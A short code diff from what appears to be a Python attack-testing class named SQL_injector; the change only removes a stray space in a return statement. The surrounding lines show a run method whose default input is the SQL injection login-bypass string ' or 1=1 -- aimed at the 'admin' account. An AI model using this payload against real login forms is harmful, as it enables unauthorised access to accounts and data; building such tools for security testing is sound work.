@@ -13,7 +13,7 @@ class SQL_injector(a.attack_inter):
             'email': myScript,
             'password': '123',
         }
-        return  json_data
+        return json_data
 
     def run(self, userInput = '\' or 1=1 --', username = 'admin'):
         a.logging.basicConfig(filename='./test_logging_info.log', level=a.logging.INFO, format='%(asctime)s %(message)s')
